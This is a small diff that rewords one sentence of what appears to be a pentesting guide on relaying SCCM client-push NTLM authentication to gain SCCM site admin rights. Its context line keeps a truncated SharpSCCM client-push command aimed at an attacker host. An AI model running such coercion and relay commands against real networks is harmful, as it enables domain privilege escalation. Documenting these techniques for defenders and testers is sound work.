@@ -244,7 +244,7 @@ SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker
 
 :::
 
-If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the sms provider server, the controlled should be now a SCCM site admin.
+If the NTLM relay attack is successful and ntlmrelayx.py has effectively sent the request to the SMS Provider server, the controlled user/account should now be an SCCM site admin.
 
 It is then possible to verify the new privileges on SCCM.
 
